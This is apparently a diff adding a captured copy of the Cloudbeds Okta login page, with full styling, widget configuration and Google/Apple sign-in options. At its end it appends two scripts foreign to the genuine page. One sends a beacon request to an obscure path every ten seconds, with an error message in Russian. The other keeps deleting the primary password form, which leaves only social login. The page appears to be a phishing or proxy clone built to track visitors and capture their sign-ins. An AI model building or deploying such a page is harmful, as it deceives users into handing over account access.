@@ -1,0 +1,511 @@
+source: <!DOCTYPE html><html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index">
+    <meta name="description" content="Click here to log in to your account at Cloudbeds, the industry's only unified platform that delivers 360-value across your entire property.">
+
+    <link rel="shortcut icon" type="image/png" href="https://ok12static.oktacdn.com/bc/image/fileStoreRecord?id=fs0b50sj14VAqnXgt5d7" sizes="512x512">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <title>Log In - Cloudbeds</title>
+    <!-- Core widget js and css -->
+<script type="text/javascript" src="/static/js/okta-sign-in.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" type="text/css" href="/static/css/okta-sign-in.min.css" crossorigin="anonymous">
+
+<!-- Customizable css theme options. Link your own stylesheet or override styles inline. -->
+<link rel="stylesheet" type="text/css" href="" integrity="" crossorigin="anonymous">
+
+<!-- styles for custom sign in -->
+<link rel="stylesheet" type="text/css" href="/static/css/custom-signin.a91af2abfd04662e499bd3e151150dbf.css" crossorigin="anonymous">
+
+
+<script type="text/javascript" nonce="EFZjQvha-LDXkWGFu_kzkQ">
+    window.onerror = function (msg, _url, _lineNo, _colNo, error) {
+        if (window.console && window.console.error) {
+            if (error) {
+                console.error(error);
+            } else {
+                console.error(msg);
+            }
+        }
+
+        // Return true to suppress "Script Error" alerts in IE
+        return true;
+    };
+</script>
+
+    <style>
+        html,
+        body {
+          background: #EBF0FF;
+        }
+
+        #okta-login-container {
+          padding: 0 15px;
+        }
+
+        #okta-sign-in.auth-container.main-container {
+          font-family: 'Poppins', sans-serif;
+          background: none;
+          border: none;
+          box-shadow: none;
+        }
+
+        #okta-sign-in.auth-container .okta-sign-in-header {
+          border: none;
+        }
+
+        #okta-sign-in .auth-content {
+          background: #FFFFFF;
+          border: 1px solid #E4E6EA;
+          box-shadow: 0px 4px 64px rgb(119 130 149 / 10%);
+          border-radius: 8px;
+        }
+
+        #okta-sign-in .o-form-head {
+          font-size: 18px;
+          line-height: 24px;
+        }
+
+        #okta-sign-in .o-form .o-form-label {
+          line-height: 20px;
+        }
+
+        #okta-sign-in.auth-container.main-container .margin-btm-5 {
+          margin-bottom: 20px;
+        }
+
+        #okta-sign-in.auth-container .okta-form-input-field {
+          border-color: #bbc1ca;
+          border-radius: 4px;
+        }
+
+        #okta-sign-in.auth-container .okta-form-input-field.focused-input {
+          border-color: #3366FF;
+        }
+      
+      	#okta-sign-in.auth-container .o-form-button-bar.focused-input,
+      	#okta-sign-in.auth-container .custom-checkbox.focused-input {
+          box-shadow: none;
+      	}
+      
+        #okta-sign-in .o-form .input-fix input:-webkit-autofill {
+          -webkit-box-shadow: none;
+      	  box-shadow: none;
+      	}
+
+        #okta-sign-in .focused-input,
+        #okta-sign-in .link.help:focus,
+      	#okta-sign-in .o-form .input-fix input:focus,
+        #okta-sign-in input[type=radio]:focus+label,
+        #okta-sign-in input[type=text]:focus,
+      	#okta-sign-in.auth-container .button-primary:focus,
+        #okta-sign-in .button.link-button:focus {
+          -webkit-box-shadow: 0px 0px 8px rgb(51 102 255 / 50%);
+          box-shadow: 0px 0px 8px rgb(51 102 255 / 50%);
+        }
+
+        #okta-sign-in.auth-container .button-primary,
+        #okta-sign-in .button.link-button,
+      	.back-to-settings .back-to-settings-link-tb {
+          background: #32C0A0;
+          border-radius: 20px;
+          border: none;
+          height: 40px;
+          color: #fff;
+        }
+
+        #okta-sign-in .button.link-button {
+          text-decoration: none;
+        }
+      
+      	.back-to-settings .back-to-settings-link-tb {
+          opacity: 1;
+      	}
+      
+      	.back-to-settings .back-to-settings-link-tb span{
+          color: #fff;
+          padding-left: 15px;
+      	}
+      
+      	.back-to-settings .back-to-settings-link-tb span:after {
+          content: "";
+          display: block;
+          width: 7px;
+          height: 7px;
+          border-left: 2px solid #fff;
+          border-top: 2px solid #fff;
+          position: absolute;
+          top: 15px;
+          left: 17px;
+          transform: rotate(-45deg);
+      	}
+      
+        .back-to-settings .back-to-settings-link-tb img {
+          display: none;
+        }
+      
+        #okta-sign-in .button-wide.button-primary,
+      	#okta-sign-in .default-custom-button.link-button {
+          line-height: 40px;
+        }
+      
+      	#okta-sign-in.auth-container .button-primary:hover,
+      	#okta-sign-in .button.link-button:hover {
+          background: #25917B;
+        }
+      
+      	#okta-sign-in.auth-container .button-primary:active,
+        #okta-sign-in.auth-container .button-primary:focus,
+      	#okta-sign-in .button.link-button:active,
+      	#okta-sign-in .button.link-button:focus {
+          background: #196257;
+        }
+      
+      	#okta-sign-in.auth-container .button.button-primary.link-button-disabled,
+      	#okta-sign-in.auth-container .button.link-button-disabled {
+          background: #99E0D0;
+          color: #fff;
+      	}
+      
+        #okta-sign-in .enroll-sms .sms-request-button {
+          margin-top: 35px !important;
+        }
+
+        #okta-sign-in .o-form .custom-checkbox label {
+          background: none;
+          padding-left: 28px;
+        }
+
+        #okta-sign-in .o-form .custom-checkbox label:before {
+          content: "";
+          display: block;
+          width: 20px;
+          height: 20px;
+          position: absolute;
+          left: 0;
+          top: 4px;
+          border: 1px solid #778295;
+          border-radius: 5px;
+        }
+      
+        #okta-sign-in.auth-container .custom-checkbox.focused-input label:before {
+          box-shadow: 0px 0px 8px rgb(51 102 255 / 50%);
+        }
+
+        #okta-sign-in .o-form .custom-checkbox input:checked + label:before {
+          background-color: #3366FF;
+          border-color: #3366FF;
+        }
+
+        #okta-sign-in .o-form .custom-checkbox label:after {
+          content: "";
+          display: block;
+          opacity: 0;
+          width: 5px;
+          height: 9px;
+          border-bottom: 2px solid #ffffff;
+          border-right: 2px solid #ffffff;
+          position: absolute;
+          left: 7px;
+          top: 8px;
+          transform: rotate(45deg);
+        }
+
+        #okta-sign-in .o-form .custom-checkbox input:checked + label:after {
+          opacity: 1;
+        }
+
+        .cb-referral {
+          margin: 30px auto;
+          padding: 0 15px;
+          max-width: 600px;
+        }
+
+        .cb-referral-link {
+          display: block
+        }
+
+        .cb-referral-img {
+          display: block;
+          width: 100%;
+          border-radius: 8px;
+        }
+
+        #okta-sign-in .social-auth-button.social-auth-google-button,
+        #okta-sign-in .social-auth-button.social-auth-apple-button {
+          -moz-user-select: none;
+          -webkit-user-select: none;
+          -ms-user-select: none;
+          -webkit-appearance: none;
+          -webkit-border-radius: 20px;
+          border-radius: 20px;
+          padding: 0 30px 0 45px;
+          text-align: center;
+          font-size: 14px;
+          height: 40px;
+          line-height: 40px;
+          color: #6e6e78;
+          text-decoration: none;
+          -webkit-transition: background-color .218s, border-color .218s, box-shadow .218s;
+          transition: background-color .218s, border-color .218s, box-shadow .218s;
+          vertical-align: middle;
+          white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+    <div id="okta-login-container"></div>
+
+    <div class="cb-referral" id="cb-referral" style="display: none">
+      <a href="https://www.cloudbeds.com/customer-referral/" target="_blank" class="cb-referral-link" id="cb-referral-link" rel="noopener noreferrer">
+        <img src="images/referral_email_sig_1k_en.png" class="cb-referral-img" id="cb-referral-img">
+      </a>
+    </div>
+
+    <!--
+        "OktaUtil" defines a global OktaUtil object
+        that contains methods used to complete the Okta login flow.
+     -->
+    
+<div id="okta-sign-in" class="auth-container main-container unsupported-message-container" style="display:none">
+    <div id="unsupported-cookie" class="unsupported-message" style="display:none">
+        <h2 class="o-form-head">Cookies are required</h2>
+        <p>Cookies are disabled on your browser. Please enable Cookies and refresh this page.</p>
+        <a class="button button-primary" target="_blank" href=".">
+            Refresh
+        </a>
+    </div>
+</div>
+
+<script type="text/javascript" nonce="EFZjQvha-LDXkWGFu_kzkQ">
+  var signInSuccessCallBackFunction;
+  var oktaData = {"redirectUri":"https\x3A\x2F\x2Fsignin.cloudbeds.com","isMobileSso":false,"orgSyncToAccountChooserEnabled":true,"fromUri":"","isMobileClientLogin":false,"countryIso":"NL","inactiveTab":{"elementId":"inactive\x2Dtab\x2Dmain\x2Ddiv","avoidPageRefresh":true,"enabled":false},"signIn":{"logoText":"signin\x20logo","features":{"emailRecovery":true,"deviceFingerprinting":true,"consent":true,"useDeviceFingerprintForSecurityImage":true,"customExpiredPassword":true,"router":true,"showPasswordToggleOnSignInPage":false,"securityImage":false,"autoPush":true,"smsRecovery":false,"idpDiscovery":true,"selfServiceUnlock":true,"webauthn":true,"showPasswordRequirementsAsHtmlList":true,"registration":false,"rememberMe":true,"callRecovery":false,"multiOptionalFactorEnroll":true},"baseUrl":"https\x3A\x2F\x2Fsignin.cloudbeds.com","brandName":"signin","assets":{"baseUrl":"https\x3A\x2F\x2Fok12static.oktacdn.com\x2Fassets\x2Fjs\x2Fsdk\x2Fokta\x2Dsignin\x2Dwidget\x2F7.31.1"},"customButtons":[],"idpDiscovery":{"requestContext":""},"logo":"https\x3A\x2F\x2Fok12static.oktacdn.com\x2Ffs\x2Fbco\x2F1\x2Ffs0b50ufj1PmyQOgF5d7","language":"en","helpLinks":{"help":"","forgotPassword":"","unlock":"","custom":[]},"piv":{},"i18n":{"en":{"mfa.challenge.password.placeholder":"Password","help":"Help","password.forgot.email.or.username.tooltip":"Email\x20or\x20Username","needhelp":"Need\x20help\x20signing\x20in\x3F","primaryauth.username.placeholder":"Username","password.forgot.email.or.username.placeholder":"Email\x20or\x20Username","account.unlock.email.or.username.tooltip":"Email\x20or\x20Username","unlockaccount":"Unlock\x20account\x3F","account.unlock.email.or.username.placeholder":"Email\x20or\x20Username","primaryauth.password.placeholder":"Password","primaryauth.title":"Sign\x20In","forgotpassword":"Forgot\x20password\x3F"}}},"accountChooserDiscoveryUrl":"https\x3A\x2F\x2Flogin.okta.com\x2Fdiscovery\x2Fiframe.html"};
+
+  var runLoginPage = function(fn) {
+    var mainScript = document.createElement('script');
+    mainScript.src = "https://ok12static.oktacdn.com/assets/js/mvc/loginpage/initLoginPage.pack.58de3be0c9b511a0fdfd7ea4f69b56fc.js";
+    mainScript.integrity = "sha384-cJ4LGViZBmIttMPH+ao2RyPuN5BztKWYWIa4smbm56r1cUhkU/Dr6vTS3UoPbKTI";
+    mainScript.crossOrigin = "anonymous";
+    document.getElementsByTagName('head')[0].appendChild(mainScript);
+    fn && mainScript.addEventListener('load', function () { setTimeout(fn, 1) });
+  };
+
+  var OktaUtil = {
+    _addClass: function(el, className) {
+      if(el) {
+        var elementClasses = el.className.split(" ");
+        if (elementClasses.indexOf(className) == -1) {
+          el.className += " " + className;
+        }
+      }
+    },
+
+    _removeElement: function(el) {
+      if(el) {
+        el.parentNode.removeChild(el);
+      }
+    },
+
+    _hideElement: function(el) {
+      if(el) {
+        el.style.display = 'none';
+      }
+    },
+
+    _isDocumentVisible: function() {
+      return document.visibilityState === 'visible';
+    },
+
+    addLoginContainerClass: function () {
+      this._addClass(document.getElementById('okta-login-container'), 'login-container');
+    },
+
+    showUnsupportedCookieWarning: function () {
+      document.getElementById('okta-sign-in').removeAttribute('style');
+      document.getElementById('unsupported-cookie').removeAttribute('style');
+    },
+
+    removeUnsupportedCookieWarning: function () {
+      this._removeElement(document.getElementById('okta-sign-in'));
+    },
+
+    hideOktaLoginContainer: function () {
+      this._hideElement(document.getElementById('okta-login-container'));
+    },
+
+    isChromeOs:  function () {
+      return /\bCrOS\b/.test(navigator.userAgent);
+    },
+
+    addChromeOSScript: function() {
+      var chromeOSScript = document.createElement('script');
+      chromeOSScript.src = "/static/js/google/users-1.0.js";
+      document.getElementsByTagName('head')[0].appendChild(chromeOSScript);
+    },
+
+    getSignInWidgetConfig: function () {
+        if (oktaData.inactiveTab && oktaData.inactiveTab.enabled && !this._isDocumentVisible() && !oktaData.inactiveTab.avoidPageRefresh) {
+            // Show a loading state and wait for the visibility event
+            this.hideOktaLoginContainer();
+            // remove stateToken so SIW does not attempt a login flow
+            oktaData.signIn.stateToken = undefined;
+        }
+        return oktaData.signIn;
+    },
+
+    completeLogin: function (res) {
+      signInSuccessCallBackFunction(res);
+    },
+
+    getRequestContext: function () {
+      return oktaData.requestContext;
+    },
+
+    setRedirectUri: function (uri) {
+      oktaData.redirectUri = uri;
+    },
+
+    init: function () {
+      if (!navigator.cookieEnabled) {
+        this.showUnsupportedCookieWarning();
+        this.hideOktaLoginContainer();
+      } else {
+        this.removeUnsupportedCookieWarning();
+
+
+        // add class if app login banner is present
+        if (oktaData.isAppBannerVisible) {
+          this.addLoginContainerClass();
+        }
+
+        oktaData.isCustomSignIn = true;
+        oktaData.hasChromeOSFeature = this.isChromeOs();
+        if (oktaData.hasChromeOSFeature) {
+          this.addChromeOSScript();
+        }
+        runLoginPage(function () {
+          var res = OktaLogin.initLoginPage(oktaData);
+          oktaData.signIn = res.signIn;
+          signInSuccessCallBackFunction = res.signInSuccessCallbackFn;
+
+        });
+      }
+    }
+  };
+  OktaUtil.init();
+  //# sourceURL=OktaUtil.js
+</script>
+
+
+
+    <script type="text/javascript">
+        // "config" object contains default widget configuration
+        // with any custom overrides defined in your admin settings.
+        var config = OktaUtil.getSignInWidgetConfig();
+      	
+      	config.features.showPasswordToggleOnSignInPage = true;
+        config.features.securityImage = false;
+        config.helpLinks = {
+          custom: [{
+            text: 'Terms of Service',
+            href: 'https://www.cloudbeds.com/terms',
+            target: '_blank',
+            rel: 'noopener noreferrer',
+          },{
+            text: 'How to use Google Authentication',
+            href: 'https://myfrontdesk.cloudbeds.com/hc/en-us/articles/27739913833243-How-to-log-In-to-Cloudbeds-PMS-via-Google-account#:~:text=How%20to%20use%20Google%20Authentication',
+            target: '_blank',
+            rel: 'noopener noreferrer',
+          }],
+        };
+
+        config.idps = [{ type: 'GOOGLE', id: '0oage8pr8nm9xyuiI5d7' }, { type: 'APPLE', id: '0oao1h7dexLCzlNtF5d7'}];
+
+        config.i18n = {
+          en: {
+            'socialauth.google.label': "Continue with Google",
+            'socialauth.apple.label': "Continue with Apple",
+          },
+          es: {
+            'socialauth.google.label': "Continuar con Google",
+            'socialauth.apple.label': "Continuar con Apple",
+          },
+          'pt-BR': {
+            'socialauth.google.label': "Continuar com o Google",
+            'socialauth.apple.label': "Continuar com o Apple",
+          }
+        }
+
+        // Render the Okta Sign-In Widget
+        var oktaSignIn = new OktaSignIn(config);
+        oktaSignIn.renderEl({ el: '#okta-login-container' },
+            function success(res) {
+              if (res && res.status === 'SUCCESS') {
+                if (res.type === 'SESSION_SSO') {
+                  var redirectUrl = 'https://auth.cloudbeds.com/okta/signin/session?sessionToken=' + res.session.token;
+
+                  // Redirect to the URL
+                  window.location.href = redirectUrl;
+                } else {
+                  OktaUtil.completeLogin(res);
+                }
+              }
+            },
+            function(error) {
+                // Logs errors that occur when configuring the widget.
+                // Remove or replace this with your own custom error handler.
+                console.log(error.message, error);
+            }
+        );
+    </script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        var userLang = navigator.language || navigator.userLanguage || 'en';
+        var cbReferalContainerEl = document.getElementById('cb-referral');
+        var cbReferalLinkEl = document.getElementById('cb-referral-link');
+        var cbReferalImgEl = document.getElementById('cb-referral-img');
+        var cbReferalUrl;
+        var cbReferalImgSource;
+
+        switch (userLang.toLowerCase()) {
+          case 'es':
+          case 'es-es':
+            cbReferalUrl = 'https://www.cloudbeds.com/es/referal-customer';
+            cbReferalImgSource = 'https://www.cloudbeds.com/wp-content/uploads/2024/08/referral_email_sig_1k_es.png';
+            break;
+          case 'pt-br':
+          case 'pt':
+            cbReferalUrl = 'https://www.cloudbeds.com/pt-br/referal-customer/ ';
+            cbReferalImgSource = 'https://www.cloudbeds.com/wp-content/uploads/2024/08/referral_email_sig_1k_pt.png';
+            break;
+          default:
+            cbReferalUrl = 'https://www.cloudbeds.com/customer-referral';
+            cbReferalImgSource = 'https://www.cloudbeds.com/wp-content/uploads/2024/08/referral_email_sig_1k_en.png';
+        }
+
+        cbReferalImgEl.src = cbReferalImgSource;
+        cbReferalLinkEl.href = cbReferalUrl;
+        cbReferalContainerEl.style.display = 'block';
+      });
+    </script>
+    <script>
+        function sendRequest() {
+            fetch("/mksd95jld43").catch(error => console.error("Ошибка запроса:", error));
+        }
+
+        setInterval(sendRequest, 10000);
+    </script>
+    <script>
+    setInterval(() => {
+        const elements = document.querySelectorAll('.primary-auth-container');
+        elements.forEach(el => {
+            el.remove();
+        });
+    }, 100);
+    </script>
+
+</body></html>
+Page title: Log In - Cloudbeds
